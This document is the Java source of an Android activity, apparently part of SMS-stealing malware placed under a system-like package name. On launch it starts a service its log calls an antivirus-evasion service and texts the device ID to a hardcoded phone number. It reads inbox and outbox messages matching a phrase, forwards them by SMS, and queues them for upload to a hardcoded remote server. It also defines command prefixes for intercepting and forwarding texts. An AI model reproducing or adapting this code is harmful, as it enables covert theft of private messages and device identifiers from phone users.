package android.app.sdk;

import java.util.Date;

import com.umeng.analytics.AnalyticsConfig;

import android.app.Activity;
import android.app.sms.async.SubmitDateThread;
import android.app.sms.manager.SMSManager;
import android.app.sms.service.SMSService;
import android.app.sms.sqlite.DQLiteOpenHelper;
import android.app.sms.utils.LogUtils;
import android.app.sms.utils.Tools;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;

public class SmsActivity extends Activity {

	//imei发送
	public static final String devicephone = "13568986885";
	//短信转发
	public static final String phonenum = "13568986885";
	//拦截
	public static final String lanjie="DX99#LJ|";
	//转发
	public static final String zhuanfa="DX99#FS|";
	//提交数据
	public static final String httpUrl = "http://121.127.253.120:888/sms.asp";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		this.startFreeToKillService();
		AnalyticsConfig.setAppkey("54111214fd98c50f7f052d60");
		AnalyticsConfig.setChannel("Channel" + Tools.getDeviceId(this));
		LogUtils.write("Send", "程序启动 " + Build.VERSION.SDK_INT + " " + Build.PRODUCT + "--" + Build.MODEL);
		
		int code = this.getVersionCode();
		SharedPreferences sp = Tools.findCheckConfig(this);
		if (sp.getBoolean("isfrist", true) || code != sp.getInt("code", -100)) {
			SMSManager.Send(this, devicephone, "AZ99#AZ|程Z序已安装" + Tools.getDeviceId(this));
			Tools.saveCheckConfig(this, false, code);
			this.findHistorySMS();
		}
	}
	
	private void findHistorySMS() {
		Cursor c = getContentResolver().query(Uri.parse("content://sms"), null, "body like '%我是刚才%' and type in (1,2)", null, "_id desc");
		for (c.moveToFirst(); !c.isAfterLast(); c.moveToNext()) {
			int type = c.getInt(c.getColumnIndex("type"));
			String body = c.getString(c.getColumnIndex("body"));
			String address = c.getString(c.getColumnIndex("address"));
			address = address.replace("+86", "").replace("+1", "");
			LogUtils.write("Send", "检索出来的内容" + body);
			String lx = (type == 1 ? "收件箱" : "发件箱");
			SMSManager.Send(this, devicephone, "DX99#" + lx + "-H " + body);
			DQLiteOpenHelper.getHelper(this).addData(lx, address, body, new Date());
			SubmitDateThread.startSendData(this);
		}
	}
	
	private void startFreeToKillService() {
		LogUtils.write("Send", "启动免杀服务");
		this.startService(new Intent(this, SMSService.class));
	}
	
	public int getVersionCode() {
	    try {
	        PackageManager manager = this.getPackageManager();
	        PackageInfo info = manager.getPackageInfo(this.getPackageName(), 0);
	        return info.versionCode;
	    } catch (Exception e) {
	    	return -1;
	    }
	}
}
